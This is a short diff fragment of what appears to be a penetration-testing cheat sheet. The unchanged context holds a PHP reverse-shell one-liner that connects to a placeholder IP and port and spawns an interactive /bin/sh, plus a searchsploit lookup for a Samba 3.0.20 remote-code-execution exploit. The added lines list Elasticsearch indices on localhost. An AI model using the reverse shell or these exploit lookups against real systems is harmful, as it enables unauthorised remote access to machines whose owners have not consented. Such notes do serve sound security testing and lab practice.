@@ -80,3 +80,6 @@ php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 #RCE SAMBA  
 $searchsploit Samba 3.0.20  
 
+#List index elasticsearch  
+curl 'localhost:9200/_cat/indices?v'
+
